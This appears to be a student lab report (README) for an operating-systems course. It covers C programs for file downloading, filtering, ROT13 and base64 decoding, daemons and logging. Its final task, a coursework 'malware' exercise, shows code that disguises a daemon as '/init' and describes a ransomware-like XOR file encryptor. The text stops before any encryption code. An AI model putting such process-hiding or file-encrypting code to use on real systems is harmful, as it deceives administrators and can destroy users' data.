# Sisop-2-2025-IT08

Anggota IT08:
| Nama | NRP |
| ---------------------- | ---------- |
| Arya Bisma Putra Refman | 5027241036 |
| Moch. Rizki Nasrullah | 5027241038 |
| Nadia Fauziazahra Kusumastuti | 5027241094 |
----

## Soal 1
[Author: Fico/ purofuro]

Kamu terbangun secara tiba-tiba di suatu [lokasi](https://dragon-pw-checker.vercel.app/) yang tidak diketahui, saat kamu melihat sekitar yang terlihat hanyalah kegelapan dan sebuah pintu dengan dua mata berwarna yang melihatmu dari lubang pintu tersebut.

![image](https://github.com/user-attachments/assets/70fcb5b1-5b0d-4d48-abfc-72f626587adc)

Ia merupakan naga bernama Cyrus yang menjaga pintu tersebut dan kamu harus meng-input password yang benar untuk masuk. Karena tidak mungkin untuk menebak password, Ia memberikanmu sebuah clue [Clues.zip](https://drive.google.com/file/d/1xFn1OBJUuSdnApDseEczKhtNzyGekauK/view). Untungnya, kamu merupakan Directory Lister yang jago sehingga clue ini dapat berubah menjadi sebuah password.

```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/wait.h>

#define CLUE_DIR "Clues"
#define FILTERED_DIR "Filtered"
```
- Mempersiapkan library dan mendeklarasikan variabel untuk pengelolaan direktori dan operasi file

A. "Downloading the Clues" → Karena kamu telah diberikan sebuah link Clues oleh Cyrus, kamu membuat file bernama action.c yang dimana kalau dijalankan seperti biasa tanpa argumen tambahan akan mendownload dan meng-unzip file tersebut secara langsung. Saat kamu melihat isi dari Clues tersebut, isinya berupa 4 folder yakni ClueA - ClueD dan di masing-masing folder tersebut terdapat .txt files dan isinya masih tidak jelas, mungkin beberapa kata di dalam .txt file yang dapat dicari di inventory website? (Note: inventory bersifat untuk seru-seruan saja).  Jangan lupa untuk menghapus Clues.zip setelah diekstrak dan buatlah apabila folder Clues sudah ada, maka command tersebut tidak akan mendownload Clues.zip lagi apabila dijalankan.

```bash
nano action.c
```
- Membuat script `action.c`

```bash
void run_command(char *const argv[]) {
    pid_t pid = fork();
    if (pid == 0) {
        execvp(argv[0], argv);
        perror("execvp failed");
        exit(EXIT_FAILURE);
    } else if (pid < 0) {
        perror("fork failed");
        exit(EXIT_FAILURE);
    } else {
        int status;
        waitpid(pid, &status, 0);
    }
}
```
- Fungsi menjalankan perintah eksternal (command) dalam proses baru, menggunakan forking dan execvp.
- `char *const argv[]`: Mendeklarasikan parameter yang menerima array pointer (array yang berisi alamat string) dan menjamin bahwa elemen array (pointer) tidak akan diubah. Namun, string yang ditunjuk oleh pointer masih bisa dimodifikasi.
- `pid_t pid = fork();`: Membuat proses anak, dimana fungsi fork() mengembalikan nilai 0 pada proses anak (di mana kode berikutnya akan dieksekusi oleh anak), nilai positif (PID dari proses anak) pada proses induk, dan nilai negatif jika fork() gagal.
- `if (pid == 0) { execvp(argv[0], argv); perror("execvp failed"); exit(EXIT_FAILURE); }`: Jika berada dalam proses anak, jalankan perintah yang diberikan (execvp). Jika gagal, tampilkan pesan error dan keluar dari proses anak dengan status gagal.
- `else if (pid < 0) { perror("fork failed"); exit(EXIT_FAILURE); }`: Jika `fork()` gagal (nilai negatif), cetak pesan error dan keluar dari program dengan status gagal.
- `else { int status; waitpid(pid, &status, 0); }`: Jika berada di proses induk, tunggu proses anak hingga selesai dengan `waitpid`.

![image](https://github.com/user-attachments/assets/bb6a5270-c517-4f29-871b-4759dac7b45c)

```bash
void download_and_extract() {
    struct stat st;
    if (stat(CLUE_DIR, &st) == 0 && S_ISDIR(st.st_mode)) {
        printf("Folder %s already exists. Skipping download.\n", CLUE_DIR);
        return;
    }
    printf("Downloading Clues.zip...\n");

    char *wget_args[] = {
        "wget",
        "-q",
        "--show-progress",
        "https://drive.usercontent.google.com/u/0/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download",
        "-O",
        "Clues.zip",
        NULL
    };
    run_command(wget_args);

    char *unzip_args[] = {
        "unzip",
        "-q",
        "Clues.zip",
        NULL
    };
    run_command(unzip_args);

    char *rm_args[] = {
        "rm",
        "Clues.zip",
        NULL
    };
    run_command(rm_args);

    printf("Downloaded and extracted Clues.zip\n");
}
```
- `struct stat st;`: Mendeklarasikan variabel st untuk menyimpan informasi status file atau folder.
- `if (stat(CLUE_DIR, &st) == 0 && S_ISDIR(st.st_mode))`: Mengecek apakah folder `Clues` sudah ada. Jika iya, tampilkan pesan dan hentikan fungsi.
- `char *wget_args[] = { ... }; run_command(wget_args);`: Menyiapkan argumen untuk `wget` dan menjalankannya menggunakan `run_command()` untuk mengunduh file `Clues.zip`.
- `char *unzip_args[] = { ... }; run_command(unzip_args);`: Menyiapkan argumen untuk `unzip` dan menjalankan perintah `unzip` untuk mengekstrak `Clues.zip`.
- `char *rm_args[] = { ... }; run_command(rm_args);`: Menyiapkan argumen untuk `rm` dan menjalankan perintah untuk menghapus `Clues.zip`.
- `printf("Downloaded and extracted Clues.zip\n");`: Menampilkan pesan bahwa proses download dan ekstraksi telah selesai.

B. "Filtering the Files" → Karena kebanyakan dari file tersebut berawal dengan 1 huruf atau angka, kamu pun mencoba untuk memindahkan file-file yang hanya dinamakan dengan 1 huruf dan 1 angka tanpa special character kedalam folder bernama Filtered. Kamu tidak suka kalau terdapat banyak clue yang tidak berguna jadi disaat melakukan filtering, file yang tidak terfilter dihapus. Karena kamu tidak ingin membuat file kode lagi untuk filtering, maka kamu menggunakan file sebelumnya untuk filtering file-file tadi dengan menambahkan argumen saat ingin menjalankan action.c

```bash
int is_valid_file(const char *name) {
    int len = strlen(name);
    return len == 5 &&
           name[1] == '.' && name[2] == 't' && name[3] == 'x' && name[4] == 't' &&
           isalnum(name[0]);
}
```
- `int len = strlen(name);`: Menghitung panjang nama file.
- `return len == 5 && ...`: Mengembalikan true (1) jika panjang nama file adalah 5 karakter, karakter ke-2 hingga ke-5 membentuk ekstensi `.txt`, dan karakter pertama adalah alfanumerik (a-z, A-Z, atau 0-9).

```bash
void filter_files() {
    DIR *d;
    struct dirent *dir;
    mkdir(FILTERED_DIR, 0755);

    char *folders[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
    for (int i = 0; i < 4; i++) {
        d = opendir(folders[i]);
        if (!d) continue;

        while ((dir = readdir(d)) != NULL) {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
                continue;

            char src_path[512];
            snprintf(src_path, sizeof(src_path), "%s/%s", folders[i], dir->d_name);

            if (is_valid_file(dir->d_name)) {
                char dest_path[512];
                snprintf(dest_path, sizeof(dest_path), "%s/%s", FILTERED_DIR, dir->d_name);

                FILE *src = fopen(src_path, "r");
                FILE *dest = fopen(dest_path, "w");
                if (src && dest) {
                    char ch;
                    while ((ch = fgetc(src)) != EOF)
                        fputc(ch, dest);
                }
                if (src) fclose(src);
                if (dest) fclose(dest);
            }
        }
        closedir(d);
    }

    for (int i = 0; i < 4; i++) {
        d = opendir(folders[i]);
        if (!d) continue;
        while ((dir = readdir(d)) != NULL) {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
                continue;

            char del_path[512];
            snprintf(del_path, sizeof(del_path), "%s/%s", folders[i], dir->d_name);
            remove(del_path);
        }
        closedir(d);
    }

    printf("Filtering completed. Original clue files removed.\n");
}
```
- `mkdir(FILTERED_DIR, 0755);`: Membuat folder Filtered dengan permission rwxr-xr-x.
- `char *folders[] = {...};`: Menyimpan path empat folder Clue.
- `for (int i = 0; i < 4; i++) { ... if (is_valid_file(dir->d_name)) { ... } }`: Membuka setiap folder clue, membaca seluruh isi folder, dan jika nama file valid `(?.txt)`, salin file-nya ke folder Filtered/.
- `for (int i = 0; i < 4; i++) { ... remove(del_path); }`: Setelah proses salin selesai, ulangi pembacaan folder dan hapus semua file di folder ClueA–ClueD.
![image](https://github.com/user-attachments/assets/ab59e8fb-c97e-4460-9992-61e91412be46)

C. "Combine the File Content" → Di setiap file .txt yang telah difilter terdapat satu huruf dan agar terdapat progress, Cyrus memberikan clue tambahan untuk meletakan/redirect isi dari setiap .txt file tersebut kedalam satu file yaitu Combined.txt dengan menggunakan FILE pointer. Tetapi, terdapat urutan khusus saat redirect isi dari .txt tersebut, yaitu urutannya bergantian dari .txt dengan nama angka lalu huruf lalu angka lagi lalu huruf lagi. Lalu semua file .txt sebelumnya dihapus. Seperti halnya tadi, agar efisien kamu ingin menjalankan action.c dengan argumen tambahan.

```bash
int is_digit_filename(const char *filename) {
    return strlen(filename) == 5 && isdigit(filename[0]) && strcmp(filename + 1, ".txt") == 0;
}

int is_alpha_filename(const char *filename) {
    return strlen(filename) == 5 && isalpha(filename[0]) && strcmp(filename + 1, ".txt") == 0;
}

int cmp_filename(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}
```
- `int is_digit_filename(const char *filename)`: Mengecek apakah filename memiliki format panjang 5 karakter, karakter pertama adalah digit (0–9), dan diikuti string `.txt`.
- `int is_alpha_filename(const char *filename)`: Mengecek apakah filename memiliki format panjang 5 karakter, karakter pertama adalah huruf (a–z atau A–Z), dan diikuti `.txt`.
- `int cmp_filename(const void *a, const void *b)`: Fungsi pembanding untuk sorting (ex. `qsort`) dan mengurutkan dua string (nama file) secara alfabetis dengan `strcmp`.

```bash
void combine_files() {
    DIR *d = opendir(FILTERED_DIR);
    struct dirent *dir;
    char *digits[100], *alphas[100];
    int d_count = 0, a_count = 0;

    if (!d) {
        perror("Could not open Filtered directory");
        return;
    }

    while ((dir = readdir(d)) != NULL) {
        if (is_digit_filename(dir->d_name)) {
            digits[d_count++] = strdup(dir->d_name);
        } else if (is_alpha_filename(dir->d_name)) {
            alphas[a_count++] = strdup(dir->d_name);
        }
    }
    closedir(d);

    qsort(digits, d_count, sizeof(char *), cmp_filename);
    qsort(alphas, a_count, sizeof(char *), cmp_filename);

    FILE *combined = fopen("Combined.txt", "w");
    if (!combined) {
        perror("Failed to create Combined.txt");
        return;
    }

    int i = 0, j = 0;
    while (i < d_count || j < a_count) {
        if (i < d_count) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, digits[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                char ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, combined);
                fclose(f);
                remove(path);
            }
            free(digits[i]);
            i++;
        }

        if (j < a_count) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, alphas[j]);
            FILE *f = fopen(path, "r");
            if (f) {
                char ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, combined);
                fclose(f);
                remove(path);
            }
            free(alphas[j]);
            j++;
        }
    }

    fclose(combined);
    printf("Combined.txt created.\n");
}
```
- `DIR *d = opendir(FILTERED_DIR);`: Membuka direktori Filtered.
- `char *digits[100], *alphas[100];`: Array penampung nama file digit dan huruf.
- `while ((dir = readdir(d)) != NULL) { if (is_digit_filename(dir->d_name)) ... else if (is_alpha_filename(dir->d_name)) ... }`: Memisahkan file berdasarkan apakah diawali digit (1.txt) atau huruf (a.txt), lalu disimpan di `array`.
- `qsort(...);`: Mengurutkan nama file secara alfabetis.
- `while (i < d_count || j < a_count) { if (i < d_count) { ... } if (j < a_count) { ... } }`: Membaca isi file digit pertama → tulis ke `Combined.txt`, hapus file → lanjut ke file huruf pertama → ulangi sampai semua habis dan Menggunakan `fgetc` dan `fputc` untuk salin isi file karakter demi karakter.
- `fclose(combined); printf("Combined.txt created.\n");`: Menutup file gabungan dan menampilkan pesan sukses.
![image](https://github.com/user-attachments/assets/acef4c98-b692-4208-bf87-8fc9c54feed0)

D. "Decode the file" → Karena isi Combined.txt merupakan string yang random, kamu memiliki ide untuk menggunakan Rot13 untuk decode string tersebut dan meletakan hasil dari yang telah di-decode tadi kedalam file bernama Decoded.txt. Jalankan file action.c dengan argumen tambahan untuk proses decoding ini.

```bash
char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}
```
- Fungsi `rot13 chiper`: Mengenkripsi/dekripsi huruf dengan mengganti setiap huruf dengan huruf ke-13 setelahnya dalam alfabet, hanya berlaku untuk huruf (A-Z, a-z).

```bash
void decode_file() {
    FILE *in = fopen("Combined.txt", "r");
    FILE *out = fopen("Decoded.txt", "w");
    if (!in || !out) return;

    char c;
    while ((c = fgetc(in)) != EOF) fputc(rot13(c), out);

    fclose(in);
    fclose(out);
    printf("Decoded.txt created.\n");
}
```
- `FILE *in = fopen("Combined.txt", "r");`: Membuka file gabungan untuk dibaca.
- `FILE *out = fopen("Decoded.txt", "w");`: Membuka/menyiapkan file hasil dekripsi untuk ditulis.
- `if (!in || !out) return;`: Jika salah satu file gagal dibuka, keluar dari fungsi.
- `while ((c = fgetc(in)) != EOF) fputc(rot13(c), out);`: Baca tiap karakter dari `Combined.txt`, lalu terapkan fungsi `rot13()` dan tulis hasilnya ke `Decoded.txt`.
- `fclose(in); fclose(out);`: Menutup kedua file setelah proses selesai.
- `printf("Decoded.txt created.\n");`: Menampilkan pesan bahwa file hasil dekripsi berhasil dibuat.
![image](https://github.com/user-attachments/assets/f0847dec-91af-4ad8-b302-97f7e2fc75bf)

```bash
int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_extract();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            fprintf(stderr, "Invalid mode. Usage: ./action [-m Filter|Combine|Decode]\n");
            return 1;
        }
    } else {
        fprintf(stderr, "Usage: ./action [-m Filter|Combine|Decode]\n");
        return 1;
    }
    return 0;
}
```
- `if (argc == 1) { download_and_extract(); }`: Jika tidak ada argumen selain nama program, maka program akan menjalankan download_and_extract(), yaitu mendownload dan mengekstrak file zip.
- `else if (argc == 3 && strcmp(argv[1], "-m") == 0) { ... }`: Jika ada dua argumen tambahan (-m dan mode), program akan memeriksa mode yang dipilih:
      - Filter → memanggil filter_files() untuk menyaring file.
      - Combine → memanggil combine_files() untuk menggabungkan file.
      - Decode → memanggil decode_file() untuk mendekripsi file.
- `else { fprintf(stderr, "Invalid mode..."); return 1; }`: Jika mode yang diberikan tidak valid, program akan menampilkan pesan kesalahan dan keluar dengan kode status 1.

E. "Password Check" → Karena kamu sudah mendapatkan password tersebut, kamu mencoba untuk mengecek apakah password yang sudah kamu dapatkan itu benar atau tidak dengan cara di-input ke lokasi tadi.
![image](https://github.com/user-attachments/assets/235bd86f-aa48-48b8-bc7a-58774ee576b7)

![image](https://github.com/user-attachments/assets/564c88b9-638c-43b7-8797-f4510c940839)

## Soal 2
 [Author: Haidar / scar / hemorrhager / 恩赫勒夫]

Pada suatu hari, Kanade ingin membuat sebuah musik baru beserta dengan anggota grup musik lainnya, yaitu Mizuki Akiyama, Mafuyu Asahina, dan Ena Shinonome. Namun sialnya, komputer Kanade terkena sebuah virus yang tidak diketahui. Setelah dianalisis oleh Kanade sendiri, ternyata virus ini bukanlah sebuah trojan, ransomware, maupun tipe virus berbahaya lainnya, melainkan hanya sebuah malware biasa yang hanya bisa membuat sebuah perangkat menjadi lebih lambat dari biasanya

A. Sebagai teman yang baik, Mafuyu merekomendasikan Kanade untuk mendownload dan unzip sebuah starter kit berisi file - file acak (sudah termasuk virus) melalui [link](1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS) berikut agar dapat membantu Kanade dalam mengidentifikasi virus - virus yang akan datang. Jangan lupa untuk menghapus file zip asli setelah melakukan unzip

```bash
 void download_file() {
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {"wget", (char *)URL, "-O", ZIP_NAME, NULL};
        execvp("wget", args);
        exit(1);
    } else {
        wait(NULL);
    }
}

void unzip_file() {
    mkdir(STARTER_KIT, 0755);
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {"unzip", "-o", ZIP_NAME, "-d", STARTER_KIT, NULL};
        execvp("unzip", args);
        exit(1);
    } else {
        wait(NULL);
    }
}

void remove_zip() {
    remove(ZIP_NAME);
}
```
Tampak pemanggilan fungsi dalam main program:

```bash
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Mendownload starter kit dari %s...\n", URL);
        download_file();

        printf("Mengekstrak starter kit...\n");
        unzip_file();

        printf("Menghapus file zip...\n");
        remove_zip();

        printf("Selesai\n");

        printf("Usage: %s [--decrypt | --quarantine | --return | --eradicate | --shutdown]\n", argv[0]);
        return 1;
    }
```
Pemanggilan dan output dalam terminal

![Image](https://github.com/user-attachments/assets/a3279f93-aab2-4fa9-a8a9-56a4af539d2a)
![Image](https://github.com/user-attachments/assets/bf712bb5-5fac-4c41-bf7a-8faf048d9c58)


B. Setelah mendownload starter kit tersebut, Mafuyu ternyata lupa bahwa pada starter kit tersebut, tidak ada alat untuk mendecrypt nama dari file yang diencrypt menggunakan algoritma Base64. Oleh karena itu, bantulah Mafuyu untuk membuat sebuah directory karantina yang dapat mendecrypt nama file yang ada di dalamnya (Hint: gunakan daemon).
Penggunaan:
    ./starterkit --decrypt
    
```bash
int base64_char_to_val(char c) {
    if ('A' <= c && c <= 'Z') return c - 'A';
    if ('a' <= c && c <= 'z') return c - 'a' + 26;
    if ('0' <= c && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

char* base64_decode(const char *input) {
    int len = strlen(input);
    if (len % 4 != 0) {
        return NULL;
    }

    int pad = 0;
    if (len >= 1 && input[len - 1] == '=') pad++;
    if (len >= 2 && input[len - 2] == '=') pad++;

    int out_len = (len * 3) / 4 - pad;
    char *output = malloc(out_len + 1);
    if (!output) return NULL;

    int i, j = 0;
    for (i = 0; i < len; i += 4) {
        int v1 = base64_char_to_val(input[i]);
        int v2 = base64_char_to_val(input[i + 1]);
        int v3 = (input[i + 2] != '=') ? base64_char_to_val(input[i + 2]) : 0;
        int v4 = (input[i + 3] != '=') ? base64_char_to_val(input[i + 3]) : 0;

        if (v1 < 0 || v2 < 0 || v3 < -1 || v4 < -1) {
            free(output);
            return NULL;
        }

        output[j++] = (v1 << 2) | (v2 >> 4);
        if (input[i + 2] != '=')
            output[j++] = ((v2 & 0x0F) << 4) | (v3 >> 2);
        if (input[i + 3] != '=')
            output[j++] = ((v3 & 0x03) << 6) | v4;
    }

    output[out_len] = '\0';
    return output;
}

void start_daemon() {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed");
        exit(1);
    }

    if (pid > 0) {
        printf("Started decryption daemon (PID: %d)\n", pid);
        FILE *f = fopen(PID_FILE, "w");
        if (f) {
            fprintf(f, "%d", pid);
            fclose(f);
        }

        char log[256];
        sprintf(log, "Successfully started decryption process with PID %d.", pid);
        log_activity(log);
        return;
    }

    if (setsid() < 0) {
        perror("setsid failed");
        exit(1);
    }

    umask(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    while (1) {
        DIR *dir = opendir(QUARANTINE);
        if (!dir) {
            log_activity("Failed to open QUARANTINE directory.");
            sleep(5);
            continue;
        }

        struct dirent *ent;
        while ((ent = readdir(dir)) != NULL) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                continue;

            char clean_name[256];
            strncpy(clean_name, ent->d_name, sizeof(clean_name) - 1);
            clean_name[sizeof(clean_name) - 1] = '\0';

            char *newline = strchr(clean_name, '\n');
            if (newline) {
                *newline = '\0';
                char log[512];
                sprintf(log, "%s - Ignored newline in filename.", ent->d_name);
                log_activity(log);
            }

            char oldpath[512];
            snprintf(oldpath, sizeof(oldpath), "%s/%s", QUARANTINE, ent->d_name);

            struct stat st;
            if (stat(oldpath, &st) == 0 && S_ISREG(st.st_mode)) {
                char *decoded = base64_decode(clean_name);
                if (decoded && strcmp(clean_name, decoded) != 0) {
                    char newpath[512];
                    snprintf(newpath, sizeof(newpath), "%s/%s", QUARANTINE, decoded);

                    if (rename(oldpath, newpath) != 0) {
                        char log[512];
                        sprintf(log, "Failed to rename %s to %s: %s", ent->d_name, decoded, strerror(errno));
                        log_activity(log);
                    } else {
                        char log[512];
                        sprintf(log, "Successfully renamed %s to %s", ent->d_name, decoded);
                        log_activity(log);
                    }
                    free(decoded);
                }
            }
        }
        closedir(dir);
        sleep(5);
    }
}
```

Pemanggilan fungsi dalam main program:

```bash
    mkdir(STARTER_KIT, 0755);
    mkdir(QUARANTINE, 0755);

    if (strcmp(argv[1], "--decrypt") == 0) {
        start_daemon();
    }
```
Pemanggilan dan output dalam terminal:

![Image](https://github.com/user-attachments/assets/e8bfdd1b-bae7-449d-a43c-fabdb5f0c267)

C. Karena Kanade adalah orang yang sangat pemalas (kecuali jika membuat musik), maka tambahkan juga fitur untuk memindahkan file yang ada pada directory starter kit ke directory karantina, dan begitu juga sebaliknya.
Penggunaan:
    ./starterkit --quarantine (pindahkan file dari directory starter kit ke karantina)
    ./starterkit --return (pindahkan file dari directory karantina ke starter kit)

```bash
void move_files(const char *src_dir, const char *dst_dir, const char *mode) {
    DIR *dir = opendir(src_dir);
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char src[512], dst[512];
        snprintf(src, sizeof(src), "%s/%s", src_dir, ent->d_name);
        snprintf(dst, sizeof(dst), "%s/%s", dst_dir, ent->d_name);

        struct stat st;
        if (stat(src, &st) == 0 && S_ISREG(st.st_mode)) {
            if (rename(src, dst) == 0) {
                char log[512];
                sprintf(log, "%s - Successfully moved to %s directory.", ent->d_name, mode);
                log_activity(log);
            } else {
                char log[512];
                sprintf(log, "Failed to move %s: %s", ent->d_name, strerror(errno));
                log_activity(log);
            }
        }
    }
    closedir(dir);
}
```
Pemanggilan fungsi dalam program utama:

```bash
     else if (strcmp(argv[1], "--quarantine") == 0) {
        move_files(STARTER_KIT, QUARANTINE, "quarantine");
        clean_newline_filenames("quarantine");
    } else if (strcmp(argv[1], "--return") == 0) {
        copy_files(QUARANTINE, STARTER_KIT, "starter kit");
    }
```
Tampilan pemanggilan dan output dalam terminal:

![Image](https://github.com/user-attachments/assets/9d22fd3a-4bbb-4297-acc4-f5bf0eee409d)
![Image](https://github.com/user-attachments/assets/8028ef15-0054-47ec-97e4-7db4487930dd)

D. Ena memberikan ide kepada mereka untuk menambahkan fitur untuk menghapus file - file yang ada pada directory karantina. Mendengar ide yang bagus tersebut, Kanade pun mencoba untuk menambahkan fitur untuk menghapus seluruh file yang ada di dalam directory karantina.
Penggunaan:
    ./starterkit --eradicate 

```bash
void copy_files(const char *src_dir, const char *dst_dir, const char *mode) {
    DIR *dir = opendir(src_dir);
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char clean_name[256];
        strncpy(clean_name, ent->d_name, sizeof(clean_name) - 1);
        clean_name[sizeof(clean_name) - 1] = '\0';

        char *newline = strchr(clean_name, '\n');
        if (newline) *newline = '\0';

        char src[512], dst[512];
        snprintf(src, sizeof(src), "%s/%s", src_dir, ent->d_name);
        snprintf(dst, sizeof(dst), "%s/%s", dst_dir, clean_name);

        struct stat st;
        if (stat(src, &st) == 0 && S_ISREG(st.st_mode)) {
            FILE *in = fopen(src, "rb");
            FILE *out = fopen(dst, "wb");

            if (!in || !out) {
                char log[512];
                sprintf(log, "Failed to open files for copy %s: %s", ent->d_name, strerror(errno));
                log_activity(log);
                if (in) fclose(in);
                if (out) fclose(out);
                continue;
            }

            char buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), in)) > 0) {
                fwrite(buffer, 1, bytes, out);
            }

            fclose(in);
            fclose(out);

            char log[512];
            sprintf(log, "%s - Successfully copied to %s directory.", clean_name, mode);
            log_activity(log);
        }
    }
    closedir(dir);
}

void eradicate_files() {
    DIR *dir = opendir(QUARANTINE);
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/%s", QUARANTINE, ent->d_name);

        struct stat st;
        if (stat(path, &st) == 0 && S_ISREG(st.st_mode)) {
            if (remove(path) == 0) {
                char log[512];
                sprintf(log, "%s - Successfully deleted.", ent->d_name);
                log_activity(log);
            } else {
                char log[512];
                sprintf(log, "Failed to delete %s: %s", ent->d_name, strerror(errno));
                log_activity(log);
            }
        }
    }
    closedir(dir);
}
```

Tampilan pemanggilan fungsi dalam main program:
```bash
    else if (strcmp(argv[1], "--eradicate") == 0) {
        eradicate_files();
    }
```
Tampilan pemanggilan dan output dalam terminal:

![Image](https://github.com/user-attachments/assets/c97a6b07-baec-4674-bc0a-86455d15385c)

E. Karena tagihan listrik Kanade sudah membengkak dan tidak ingin komputernya menyala secara terus - menerus, ia ingin program decrypt nama file miliknya dapat dimatikan secara aman berdasarkan PID dari proses program tersebut.
Penggunaan:
    ./starterkit --shutdown

```bash
void shutdown_daemon() {
    FILE *f = fopen(PID_FILE, "r");
    if (!f) {
        printf("No PID file found.\n");
        return;
    }

    int pid;
    fscanf(f, "%d", &pid);
    fclose(f);

    if (kill(pid, SIGTERM) == 0) {
        char log[256];
        sprintf(log, "Successfully shut off decryption process with PID %d.", pid);
        log_activity(log);
        remove(PID_FILE);
    } else {
        char log[256];
        sprintf(log, "Failed to kill process %d: %s", pid, strerror(errno));
        log_activity(log);
    }
}
```
Tampilan pemanggilan fungsi dalam main program:
```bash
     else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown_daemon();
    }
```
![Image](https://github.com/user-attachments/assets/67539d40-20f2-4e9b-880f-0c8403607d61)

F. Mafuyu dan Kanade juga ingin program mereka dapat digunakan dengan aman dan nyaman tanpa membahayakan penggunanya sendiri, mengingat Mizuki yang masih linglung setelah keluar dari labirin Santerra De Laponte. Oleh karena itu, tambahkan error handling sederhana untuk mencegah penggunaan yang salah pada program tersebut.

Error handling dalam main program:
```bash
 else {
        printf("Invalid option.\n");
        return 1;
    }
```

G. Terakhir, untuk mencatat setiap penggunaan program ini, Kanade beserta Mafuyu ingin menambahkan log dari setiap penggunaan program ini dan menyimpannya ke dalam file bernama activity.log.
Format:
    i. Decrypt: 
        [dd-mm-YYYY][HH:MM:SS] - Successfully started decryption process with PID <pid>.

    ii. Quarantine:
        [dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully moved to quarantine directory.

    iii. Return:
        [dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully returned to starter kit directory.

    iv. Eradicate:
        [dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully deleted.

    v. Shutdown:
       [dd-mm-YYYY][HH:MM:SS] - Successfully shut off decryption process with PID <pid>.
```bash
void log_activity(const char *message) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        fprintf(log, "[%02d-%02d-%d][%02d:%02d:%02d] - %s\n",
                t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
                t->tm_hour, t->tm_min, t->tm_sec, message);
        fclose(log);
    }
}
```
Activity log dapat dilihat menggunakan perintah:

```bash
    cat activity.log
```
![Image](https://github.com/user-attachments/assets/a61dff7b-674e-44f0-a621-f376cb2fdc84)


## Soal 3
[Author: Afnaan / honque]

Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini

![image](https://github.com/user-attachments/assets/a5aa5a54-1cca-42a2-930a-9e7cc9966b19)

A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.

```bash
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
```
- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama (argv[0], yaitu nama program) adalah "init".
- `daemonize();`: Mengubah proses menjadi daemon (background process).
- `chdir(cwd);`: Berpindah ke direktori kerja (cwd) yang sebelumnya sudah ditentukan agar daemon tahu lokasi kerjanya.
- `prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`: Mengatur nama proses di sistem menjadi "/init" untuk menyamarkan diri seolah proses sistem utama.

![WhatsApp Image 2025-04-17 at 22 13 30_26168392](https://github.com/user-attachments/assets/0b3d5d64-c70f-4c2f-b86d-fd14c5c94435)

B. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.

```bash
void encrypt_all_files(const char *dirpath, const char *self_exe) {
